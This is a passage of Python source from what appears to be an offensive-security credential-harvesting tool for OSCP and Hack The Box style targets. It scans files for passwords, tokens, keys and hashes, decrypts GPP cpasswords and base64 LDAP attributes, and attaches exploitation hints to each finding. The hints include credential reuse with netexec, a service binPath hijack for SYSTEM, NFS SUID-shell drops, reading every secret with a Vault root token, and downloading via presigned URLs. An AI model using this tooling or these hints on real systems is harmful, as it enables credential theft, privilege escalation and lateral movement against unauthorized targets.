                        if filters.is_doc_file(path):
                            continue
                        target = am.group(1).strip()
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"smbmap -R sensitive file: {target[:100]}",
                                   hint=("smbclient.py <user>@<host> -p '<pw>' or smbmap -H <host> "
                                         "-u <user> -p '<pw>' --download '<share>/<path>'  "
                                         "(grab the file - often a quick win on OSCP+ AD boxes)"))
                        hit = True
                        break
                    # ---- iter-20 dispatch branches ----
                    if name == "Elastix AMPDBPASS":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Elastix AMP* secret: {val}",
                                   hint=("PBX/FreePBX MySQL password - reuse on the box's root pw "
                                         "(HTB Beep pattern); mysql -u root -p'" + val + "'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "PHP bracketed array secret":
                        val = am.group(1)
                        if filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"PHP $cfg[..] secret: {val}",
                                   hint="PHP bracketed-array literal - reuse against the DB / service the config talks to")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Tomcat context Resource":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or p.lower() in ("changeit", "tomcat", "manager"):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Tomcat Resource {u}:{p}",
                                   hint=("DataSource cred from context.xml - DB login: "
                                         "mysql/psql -u '" + u + "' -p'" + p + "'  (also try tomcat manager-gui)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Tomcat keystorePass":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.lower() in ("changeit", "tomcat"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Tomcat keystore/truststore password: {pw}",
                                   hint=("keytool -list -v -keystore <file> -storepass '" + pw + "'  "
                                         "- extract certs; also try same pw on the Tomcat manager"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "IPSec pre-shared-key":
                        psk = am.group(1).strip()
                        if filters.is_placeholder(psk) or filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"IPSec PSK: {psk}",
                                   hint=("PSK from pfSense/strongSwan/Cisco config - establish VPN tunnel: "
                                         "ipsec.conf + ipsec.secrets with this PSK then route to internal LAN"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=psk,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "showmount -e export":
                        # Only fire on plausibly-showmount-shaped files (not arbitrary
                        # logs that happen to have /path lines)
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        if not ("showmount" in plow or "nfs" in base or "nmap" in plow
                                or path.lower().endswith((".txt", ".log", ".nmap"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        export_path, hosts = am.group(1), am.group(2)
                        # skip noisy fs paths
                        if export_path.startswith(("/proc/", "/sys/", "/dev/", "/run/", "/tmp/")):
                            continue
                        sev = "HIGH" if hosts.strip() == "*" else "MEDIUM"
                        report.add(sev, "RECON", path, lineno,
                                   f"NFS export: {export_path}  allowed-from: {hosts}",
                                   hint=("if no_root_squash present: mount -t nfs <ip>:" + export_path +
                                         " /mnt; drop a SUID-shell binary as local root -> SUID-root on target; "
                                         "else try mount + browse for sensitive files"))
                        hit = True
                        break
                    if name == "accesschk service block":
                        plow = path.lower()
                        if not ("accesschk" in plow or "winpeas" in plow
                                or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        # capture the service name (the regex matches only the line;
                        # service name is everything after the indented RW)
                        m = re.match(r'\s*RW\s+([A-Z][A-Za-z0-9_$.]{2,40})\s*$', line)
                        if not m:
                            continue
                        svc = m.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"AccessChk RW on service: {svc}",
                                   hint=("writable service permissions - sc config " + svc +
                                         " binPath= <evil>; sc start " + svc +
                                         "  (SYSTEM via service replacement)"))
                        hit = True
                        break
                    if name == "ASP.NET encrypted config":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "ASP.NET <EncryptedData> in web.config (RsaProtectedConfigurationProvider)",
                                   hint=("offline decrypt: aspnet_regiis -pdf 'connectionStrings' <site-path>  "
                                         "(needs the RSA key container - either on box or extract from "
                                         "%SystemRoot%\\Microsoft.NET\\v*\\Config\\RsaProtectedConfigurationProvider)"))
                        hit = True
                        break
                    if name == "AutoLogon DefaultUser":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"AutoLogon default principal: {val}",
                                   hint="pair with adjacent DefaultPassword finding; that's the AutoLogon principal+pw")
                        hit = True
                        break
                    # iter-86: RDP saved session artifacts. Only fire when the
                    # file extension is .rdp (or .rdg for RDCMan) - the field
                    # syntax 'username:s:foo' / 'full address:s:foo' is
                    # unambiguous but not worth a global keyword sweep.
                    if name in ("RDP saved user", "RDP target host"):
                        _pl = path.lower()
                        if not (_pl.endswith((".rdp", ".rdg"))):
                            continue
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        if name == "RDP saved user":
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDP saved session for user: {val}",
                                       hint=("pair with the 'password 51:b:' DPAPI blob in this "
                                             ".rdp file - decrypt via impacket-dpapi credential "
                                             "using the user's masterkey (see R-DPAPI chain)"))
                        else:  # RDP target host
                            _host_only = val.split(":", 1)[0]
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDP saved target host: {val}",
                                       hint=f"the saved-cred user in this file was RDP'd to {_host_only}; try any recovered cred there")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.learn_host(names=[_host_only])
                                store.add(Evidence(kind="service", host=_host_only,
                                                    port=3389, service="rdp",
                                                    source=path, line=lineno))
                        hit = True
                        break
                    # iter-87: RDCMan .rdg XML variant - only fire on .rdg
                    # (or the special 'rdcman.settings' file), never on the
                    # thousands of other .xml/.config files that use these
                    # generic tag names (<name>, <domain>, <userName> also
                    # show up in Java Spring beans and .NET web.config).
                    if name in ("RDCMan user", "RDCMan domain", "RDCMan server"):
                        _pl = path.lower()
                        _base = os.path.basename(_pl)
                        if not (_pl.endswith(".rdg") or _base == "rdcman.settings"):
                            continue
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        if name == "RDCMan user":
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDCMan saved profile user: {val}",
                                       hint=("pair with the <password> DPAPI blob in this .rdg -"
                                             " impacket-dpapi credential -key 0x<sha1> to decrypt"))
                        elif name == "RDCMan domain":
                            report.add("MEDIUM", "RECON", path, lineno,
                                       f"RDCMan saved profile domain: {val}",
                                       hint="AD domain the RDCMan profile authenticates to")
                        else:  # RDCMan server
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDCMan saved server: {val}",
                                       hint=f"target host in the operator's RDCMan file; try any recovered cred against {val}")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.learn_host(names=[val])
                                store.add(Evidence(kind="service", host=val,
                                                    port=3389, service="rdp",
                                                    source=path, line=lineno))
                        hit = True
                        break
                    if name == "GPP cpassword inline":
                        blob = am.group(1)
                        if filters.is_placeholder(blob) or filters.is_canonical_sample(blob):
                            continue
                        # iter-20: attempt deterministic decrypt via the MS-
                        # published AES key. If `cryptography` lib is installed
                        # the operator gets the plaintext directly; else we
                        # fall back to the gpp-decrypt CLI hint.
                        plain = filters.decrypt_gpp(blob)
                        if plain and not filters.is_placeholder(plain):
                            # iter-141: shell-safe escape for the hint's -p value.
                            _plain_sh = plain.replace("'", "'\\''")
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"GPP cpassword DECRYPTED: {plain}",
                                       hint=(f"plaintext recovered via published MS AES key; reuse: "
                                             f"netexec smb <DC-IP> -u '<user>' -p '{_plain_sh}' --local-auth"))
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", plaintext=plain,
                                                   source=path, line=lineno))
                        else:
                            report.add("CRITICAL", "GPP cpassword", path, lineno,
                                       f"GPP cpassword blob: {blob[:30]}...",
                                       hint="gpp-decrypt '" + blob + "'   (fixed AES key MS published - cleartext on stdout)")
                        hit = True
                        break
                    # Splunk authentication.conf hashed admin password
                    if name == "Splunk authentication":
                        h = am.group(1)
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"Splunk admin sha512crypt: {h[:30]}...",
                                   hint="hashcat -m 1800 splunk.hash rockyou.txt")
                        from analyzers.patterns import HASHES
                        HASHES.append(("1800", "sha512crypt", h, path, lineno))
                        hit = True
                        break
                    # ---- iter-10 dispatch branches ----
                    # Vault unseal key: high-value, marks a vault as crackable
                    # (need M of N keys to unseal; if you have N keys in loot,
                    # you OWN the vault).
                    if name == "Vault unseal key":
                        k = am.group(1)
                        # iter-11 FP audit: HashiCorp docs publish literal sample
                        # 'Unseal Key 1: dEadBeEf...' rows; add is_known_example
                        # + canonical-sample gate alongside the placeholder check.
                        if (filters.is_placeholder(k) or filters.is_known_example(k)
                                or filters.is_canonical_sample(k)):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"Vault unseal key share: {k}",
                                   hint="vault operator unseal '" + k + "'  (need M of N shares; collect from loot)")
                        hit = True
                        break
                    if name == "Vault root token":
                        t = am.group(1)
                        if (filters.is_placeholder(t) or filters.is_known_example(t)
                                or filters.is_canonical_sample(t)):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"Vault root token: {t}",
                                   hint="export VAULT_TOKEN='" + t + "'; vault secrets list  - read EVERY mounted secret store")
                        hit = True
                        break
                    if name == "kubectl --token":
                        t = am.group(1)
                        # iter-11: also placeholder-gate kubectl bearer
                        if filters.is_placeholder(t):
                            continue
                        # iter-12 composite gate: a real kubectl invocation
                        # carries --server / --kubeconfig / -s / --insecure
                        # OR the same line has the api server URL. A bare
                        # `kubectl --token=...` in a tutorial usually doesn't.
                        if not re.search(
                            r'(?i)--server[=\s]+\S|--kubeconfig[=\s]+\S|'
                            r'-s\s+https?://|--insecure-skip-tls-verify|'
                            r'https?://[^\s]+:6443|api\.\w+\.k8s', line):
                            # downgrade to HIGH (no auth-complete context)
                            sev = "HIGH"
                            sevhint = ("kubectl bearer token (no server on this line) - "
                                       "check operator notes for the K8s API endpoint")
                        else:
                            sev = "CRITICAL"
                            sevhint = ("kubectl --token='" + t +
                                       "' --server=<api> auth can-i --list  - enumerate role privs")
                        report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                   f"kubectl bearer token: {t[:30]}...",
                                   hint=sevhint)
                        hit = True
                        break
                    if name == "Helm values secret":
                        var, val = am.group(1), am.group(2)
                        # iter-11 FP audit: helm 'secretKey: TBD-later' on a
                        # README/schema/example file is documentation. Gate on
                        # known helm-shaped filenames + the existing placeholder
                        # check; also reject 'tbd', 'fixme', 'todo' literals.
                        base = os.path.basename(path).lower()
                        if (filters.is_placeholder(val)
                                or filters.is_known_example(val)
                                or filters.is_doc_file(path)
                                or base.endswith((".schema.json", "-schema.yaml"))
                                or "example" in base or "sample" in base):
                            continue
                        if val.lower() in ("tbd", "fixme", "todo", "later",
                                           "tbd-later", "fill-in", "fill_in",
                                           "_template_"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Helm values.{var}: {val}",
                                   hint="reuse on the deployed service or pod's container")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Terraform tfvars secret":
                        var, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"tfvars {var}: {val}",
                                   hint="terraform .tfvars literal - reuse for the provisioned resource")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "S3 presigned URL":
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"S3/GCS presigned URL: {line.strip()[:120]}",
                                   hint="curl '<url>' -o stolen.bin   - signed URL gives direct access without further auth")
                        hit = True
                        break
                    if name == "AWS assume-role profile":
                        role = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"AWS assume-role chain: {role}",
                                   hint="aws sts assume-role --role-arn '" + role + "' --role-session-name s   - multi-account pivot")
                        hit = True
                        break
                    if name == "Jenkins build env secret":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Jenkins build env secret: {line.strip()[:140]}",
                                   hint="Jenkins build leaked a secret in env dump - reuse on the target service")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # SaaS service token: VAR_NAME=value
                    if name == "SaaS service token":
                        var, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val) or filters.is_canonical_sample(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{var}: {val}",
                                   hint=f"SaaS API token for {var} - validate offline by checking format; do NOT hit live endpoints during the exam")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-11 deep-corpus dispatch branches ----
                    if name == "AAD/MSA refresh token":
                        tok = am.group(1)
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"AAD/MSA refresh token: {tok[:30]}...",
                                   hint="exchange for access token: TokenTactics / ROADtools; FOCI=1 means it works for ANY 1P app")
                        hit = True
                        break
                    if name == "AAD FOCI marker":
                        # iter-13: intel-only marker (no credential value).
                        # Demote to LOW - context for the paired refresh_token.
                        report.add("LOW", "RECON", path, lineno,
                                   "AAD FOCI=1 (refresh token works for any 1P Microsoft app)",
                                   hint="pair with the AAD refresh_token above; foci tokens grant Graph/AzureCLI/Teams scopes interchangeably")
                        hit = True
                        break
                    if name == "Cisco type-7 password":
                        ct = am.group(1)
                        report.add("CRITICAL", "PASSWORD HASHES", path, lineno,
                                   f"Cisco type-7 reversible: {ct}",
                                   hint="instant decode: ciscot7.py -d " + ct + "  - reversible XOR with published key")
                        from analyzers.patterns import HASHES
                        HASHES.append(("0", "Cisco type-7", ct, path, lineno))
                        hit = True
                        break
                    if name in ("PFX export/import password",
                                "Certipy -pfx password"):
                        pw = am.group(1).strip("'\"")
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"PFX cert password: {pw}",
                                   hint=f"openssl pkcs12 -in <file> -nodes -password pass:'{pw}'  - extract key; certipy auth -pfx <out> -password '{pw}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "mRemoteNG Node creds":
                        u, p = am.group(1), am.group(2)
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"mRemoteNG node: {u}:<encrypted {p[:20]}...>",
                                   hint="mremoteng-decrypt.py -f confCons.xml  - AES-CBC w/ default key 'mR3m'; cleartext on stdout")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="ciphertext", user=u,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "pidgin IM cleartext":
                        proto, u, p = am.group(1), am.group(2), am.group(3)
                        if filters.is_placeholder(p):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"pidgin {proto}: {u}:{p}",
                                   hint=f"plaintext IM cred - reuse: this acct often shares pw with the host or domain account")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "curl/wget -u basic-auth":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"HTTP basic on cmdline: {u}:{p}",
                                   hint=f"reuse: nxc smb <host> -u '{u}' -p '{p}' ; also try VPN / SSO / webmail")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "AD custom-attr b64 password":
                        attr, b64v = am.group(1), am.group(2)
                        # only fire on LDIF-shaped basenames or surroundings;
                        # this rule is line-only so check filename + skip code/doc
                        plow = path.lower()
                        is_ldap_artifact = (plow.endswith((".ldif", ".ldap", ".ldp"))
                                            or "ldap" in plow or "bloodhound" in plow
                                            or "cascade" in plow)
                        if not is_ldap_artifact:
                            continue
                        if filters.is_placeholder(b64v) or filters.is_canonical_sample(b64v):
                            continue
                        import base64 as _b64
                        decoded = None
                        try:
                            raw = _b64.b64decode(b64v, validate=True)
                            try:
                                decoded = raw.decode("utf-16-le").rstrip("\x00")
                                if not decoded.isprintable():
                                    decoded = None
                            except Exception:
                                pass
                            if not decoded:
                                try:
                                    decoded = raw.decode("utf-8")
                                    if not decoded.isprintable():
                                        decoded = None
                                except Exception:
                                    pass
                        except Exception:
                            pass
                        if decoded:
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"AD {attr}: {decoded}  (b64-decoded)",
                                       hint=f"custom LDAP attribute carried base64 cleartext - reuse: nxc smb <host> -u <user> -p '{decoded}'")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", plaintext=decoded,
                                                   source=path, line=lineno))
                        else:
                            report.add("HIGH", "ENCODED/DECODED", path, lineno,
                                       f"AD {attr} b64 (decode failed): {b64v[:40]}...",
                                       hint="non-UTF-8/UTF-16 blob; may be NT hash / DPAPI / kerberos key")
                        hit = True
                        break
                    if name in ("netsh wlan Key Content", "wlan keyMaterial XML"):
                        psk = am.group(1).strip()
                        if filters.is_placeholder(psk):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Wi-Fi PSK: {psk}",
                                   hint="WPA-PSK plaintext - reuse on the captured wifi; also try as host pw (common reuse)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=psk,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # PHP define('CONST', 'value') -> 2-group capture
                    if name == "PHP define secret":
                        const, val = am.group(1), am.group(2)
                        if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{const}: {val}",
                                   hint="PHP define() literal - reuse directly")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    # default 1-group capture
                    val = am.group(1)
                    if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                        continue
                    report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                               f"{name}: {val}",
                               hint="plaintext credential in script/config - reuse directly")
                    if store is not None:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                    hit = True
                    break
                if hit:
                    continue

                # ---- pass 3: generic keyword = value ----
                if credline.looks_like_noise(line):
                    continue
                m = KEY.search(line)
                if not m:
                    continue
                value = re.split(r'\s+[#;]\s', m.group(2).strip())[0].strip()
                if not value:
                    continue
                if require_quote and not (value[:1] in "'\"" or '"' in value or "'" in value):
                    continue
                if not _value_ok(value, line):
                    continue
                snippet = line.strip()
                if len(snippet) > 140:
                    snippet = snippet[:140] + "..."
                report.add("HIGH", "ASSIGNED SECRETS", path, lineno, snippet)
    except Exception:
        pass
    # File-level multi-line passes (after the line-by-line scan completes).
    _multiline_passes(path, report, store)
